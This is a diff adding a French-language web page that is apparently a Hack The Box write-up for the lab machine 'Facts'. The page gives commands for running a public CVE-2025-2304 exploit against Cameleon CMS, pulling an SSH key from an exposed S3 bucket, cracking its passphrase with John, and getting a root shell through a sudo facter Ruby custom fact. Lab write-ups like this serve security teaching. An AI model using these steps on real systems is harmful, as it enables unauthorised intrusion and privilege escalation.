@@ -1,0 +1,141 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Facts">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Facts</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-easy">Easy</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">31 Jan 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-2304</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #27ae60; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Easy Linux — CVE-2025-2304 dans Cameleon CMS expose des credentials AWS, un bucket S3 interne contient une clé SSH protégée par une passphrase faible craquée par John, puis escalade via facter (sudo abuse Ruby custom facts).</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'CVE-2025-2304 — Cameleon CMS 2.9.0', r:'Credentials AWS exposés via config CMS' },
+        { n:'2', v:'AWS CLI + endpoint local :54321', r:'Clé SSH privée + nom utilisateur trivia' },
+        { n:'3', v:'ssh2john + John the Ripper (rockyou)', r:'Passphrase craquée → SSH trivia + user flag' },
+        { n:'4', v:'sudo facter + custom fact Ruby', r:'Shell root → root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — CVE-2025-2304 : Cameleon CMS Account Takeover</h2>
+    <p>La version Cameleon CMS 2.9.0 est vulnérable à CVE-2025-2304 permettant une prise de contrôle du compte administrateur. Un exploit public est disponible sur GitHub.</p>
+    <pre is:raw>git clone https://github.com/Alien0ne/CVE-2025-2304
+cd CVE-2025-2304
+pip install requests
+
+python3 exploit.py -u http://facts.htb -U admins -P admins --newpass admins -e -r
+# L'exploit réussit et révèle des credentials AWS (Access Key + Secret Key)
+# via la configuration exposée du CMS</pre>
+
+    <h2>2 — Énumération S3 & Récupération Clé SSH</h2>
+    <pre is:raw>aws configure
+# Access Key ID     : [récupéré via CVE-2025-2304]
+# Secret Access Key : [récupéré via CVE-2025-2304]
+# Region            : us-east-1
+
+aws --endpoint-url http://facts.htb:54321 s3 ls
+# 2026-01-20 internal
+
+aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
+# authorized_keys
+# id_ed25519
+
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_25519
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./
+
+cat authorized_keys
+# trivia@facts</pre>
+
+    <h2>3 — Crack Passphrase SSH + User Flag</h2>
+    <p>La clé privée est protégée par une passphrase. Conversion pour John puis attaque par dictionnaire.</p>
+    <pre is:raw>ssh2john id_25519 > hash.txt
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Résultat → dragonballz
+
+# Vérification de la clé
+ssh-keygen -y -f id_25519
+
+chmod 600 id_25519
+ssh -i id_25519 trivia@facts.htb
+# Passphrase : dragonballz
+
+cat ~/user.txt</pre>
+
+    <h2>4 — Sudo Facter : Custom Fact Ruby → root</h2>
+    <pre is:raw>sudo -l
+# (ALL) NOPASSWD: /usr/bin/facter</pre>
+    <p>Facter supporte des "custom facts" via des scripts Ruby chargés et exécutés avec les droits sudo. La méthode exec() remplace le processus courant par bash avec -p (preserve privileges).</p>
+    <pre is:raw>cat > /tmp/pwn.rb << 'EOF'
+Facter.add(:pwn) do
+  setcode do
+    exec("/bin/bash -p")
+  end
+end
+EOF
+
+sudo facter --custom-dir=/tmp pwn
+# root shell obtenu !
+
+whoami   # root
+cat /root/root.txt</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Une seule clé SSH dans un bucket S3 mal configuré suffit à compromettre un système',
+        'Le chiffrement seul ne suffit pas : dragonballz est craqué en quelques secondes',
+        'sudo -l doit être le premier réflexe après l\'obtention d\'un shell',
+        'Les outils basés sur Ruby/Python avec sudo NOPASSWD = vecteur d\'escalade immédiat',
+        'CVE-2025-2304 : les CMS mal maintenus exposent souvent des configurations sensibles',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['CVE-2025-2304 exploit','aws-cli','ssh2john','john','ssh','sudo + facter'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
